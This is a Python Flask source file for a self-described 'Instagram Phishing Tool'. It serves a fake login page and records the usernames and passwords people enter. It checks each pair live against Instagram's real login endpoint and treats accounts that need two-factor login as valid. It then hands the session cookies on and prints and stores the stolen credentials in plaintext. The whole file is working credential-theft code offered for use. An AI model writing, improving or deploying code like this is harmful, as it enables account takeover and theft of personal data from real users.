from flask import Flask, request, redirect, render_template, Response, make_response
import requests
import threading
import time
import os
import signal
import sys
import json
from urllib.parse import unquote
from bs4 import BeautifulSoup

app = Flask(__name__)

# Global variables to store credentials
credentials = []
lock = threading.Lock()

# NEW: Banner Function
def banner():
    os.system('clear')
    print("""
    ╔══════════════════════════════════════════════════════════════╗
    ║                                                              ║
    ║      ██╗  ██╗ ██████╗ ███╗   ██╗███████╗ █████╗ ████████╗    ║
    ║      ██║  ██║██╔═══██╗████╗  ██║██╔════╝██╔══██╗╚══██╔══╝    ║
    ║      ███████║██║   ██║██╔██╗ ██║█████╗  ███████║   ██║       ║
    ║      ██╔══██║██║   ██║██║╚██╗██║██╔══╝  ██╔══██║   ██║       ║
    ║      ██║  ██║╚██████╔╝██║ ╚████║███████╗██║  ██║   ██║       ║
    ║      ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝   ╚═╝       ║
    ║                                                              ║
    ║                     ──────────────────────                   ║
    ║                     INSTAGRAM PHISHING TOOL                  ║
    ║                     ──────────────────────                   ║
    ║                                                              ║
    ║          [+] Coded By: CyberHunt                             ║
    ║          [+] Version: 1.0                                    ║
    ║                                                              ║
    ╚══════════════════════════════════════════════════════════════╝
    """)

# NEW: Status Display Function
def print_status(message, status_type="info"):
    timestamp = time.strftime("%H:%M:%S")
    if status_type == "success":
        print(f"\033[92m[{timestamp}] [+] SUCCESS: {message}\033[0m")
    elif status_type == "error":
        print(f"\033[91m[{timestamp}] [-] ERROR: {message}\033[0m")
    elif status_type == "warning":
        print(f"\033[93m[{timestamp}] [!] WARNING: {message}\033[0m")
    elif status_type == "info":
        print(f"\033[96m[{timestamp}] [*] INFO: {message}\033[0m")
    else:
        print(f"[{timestamp}] {message}")

@app.route('/')
def index():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    
    # Store credentials
    with lock:
        credentials.append({'username': username, 'password': password, 'timestamp': time.time()})
    
    # NEW: Improved status message
    print_status(f"New login attempt for username: {username}", "info")
    
    # Check if credentials are valid
    result = check_credentials(username, password)
    if isinstance(result, tuple):
        is_valid, session_info = result
    else:
        is_valid = result
        session_info = None

    if is_valid:
        # NEW: Improved success message
        print_status(f"Valid credentials found for: {username}", "success")
        print_status(f"Password: {password}", "success")
        
        # Create a response that redirects to Instagram
        response = make_response(redirect('https://www.instagram.com/'))
        
        # If we have session cookies, set them in the user's browser
        if session_info and 'cookies' in session_info:
            for cookie in session_info['cookies']:
                response.set_cookie(cookie['name'], cookie['value'])
        
        return response
    else:
        # NEW: Improved error message
        print_status(f"Invalid credentials for username: {username}", "error")
        # Show error on fake page
        return render_template('login.html', error=True)

def check_credentials(username, password):
    try:
        session = requests.Session()
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0',
        }
        session.headers.update(headers)

        response = session.get('https://www.instagram.com/')
        csrf_token = session.cookies.get_dict().get('csrftoken')

        login_page_response = session.get('https://www.instagram.com/accounts/login/')
        
        soup = BeautifulSoup(login_page_response.content, 'html.parser')
        
        shared_data_script = soup.find('script', string=lambda t: t and 'window._sharedData' in t)
        shared_data = {}
        if shared_data_script:
            json_text = shared_data_script.string.split(' = ')[1].rstrip(';')
            shared_data = json.loads(json_text)

        rollout_hash = shared_data.get('rollout_hash', 'd7506f1c97a0')

        login_url = 'https://www.instagram.com/accounts/login/ajax/'
        enc_password = f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}'
        
        login_data = {
            'username': username,
            'enc_password': enc_password,
            'queryParams': '{}',
            'optIntoOneTap': 'false',
            'stopDeletion': 'false',
            'trustedDevice': 'false',
            'trusteSignal': 'false',
        }

        post_headers = {
            'X-CSRFToken': csrf_token,
            'X-Requested-With': 'XMLHttpRequest',
            'X-Instagram-AJAX': rollout_hash,
            'Referer': 'https://www.instagram.com/accounts/login/',
            'Origin': 'https://www.instagram.com',
        }
        session.headers.update(post_headers)

        response = session.post(login_url, data=login_data)
        response_json = response.json()
        
        # NEW: Use the new print_status function for debug
        print_status(f"Instagram Response: {response_json.get('status')}", "info")
        
        if response_json.get('authenticated'):
            return True, {'cookies': [{'name': c.name, 'value': c.value} for c in session.cookies]}
        
        elif response_json.get('two_factor_required'):
            # NEW: Use the new print_status function for 2FA
            print_status(f"2FA Required for user: {username}. Credentials are valid.", "warning")
            return True, {'cookies': [{'name': c.name, 'value': c.value} for c in session.cookies]}
        
        else:
            return False, None

    except Exception as e:
        # NEW: Use the new print_status function for errors
        print_status(f"Error checking credentials: {e}", "error")
        return False, None

def display_credentials():
    while True:
        with lock:
            if credentials:
                print("\n" + "="*60)
                print_status("Captured Credentials Log", "info")
                print("="*60)
                for cred in credentials[-5:]:  # Show last 5 credentials
                    print(f"\033[93mUsername: {cred['username']}\033[0m")
                    print(f"\033[93mPassword: {cred['password']}\033[0m")
                    print(f"\033[93mTimestamp: {time.ctime(cred['timestamp'])}\033[0m")
                    print("-" * 60)
        time.sleep(5)

def signal_handler(sig, frame):
    print('\n')
    print_status("Shutting down server...", "warning")
    sys.exit(0)

if __name__ == '__main__':
    # NEW: Display the banner first
    banner()
    
    # Start the credentials display thread
    cred_thread = threading.Thread(target=display_credentials)
    cred_thread.daemon = True
    cred_thread.start()
    
    # Register signal handler for Ctrl+C
    signal.signal(signal.SIGINT, signal_handler)
    
    # NEW: Improved startup messages
    print_status("Instagram Phishing Tool Started", "success")
    print_status("Access the tool at: http://localhost:8080", "info")
    print_status("Waiting for incoming connections...", "info")
    print_status("Press Ctrl+C to stop the server", "warning")
    print("="*60)
    
    app.run(host='0.0.0.0', port=8080, debug=False)

# NEW: Function to save credentials to a file
def save_to_file(data):
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    with open('captured_credentials.txt', 'a') as f:
        f.write(f"Timestamp: {timestamp}\n")
        f.write(f"Username: {data['username']}\n")
        f.write(f"Password: {data['password']}\n")
        f.write(f"Status: {data['status']}\n")
        f.write(f"Details: {data['details']}\n")
        f.write("="*50 + "\n")
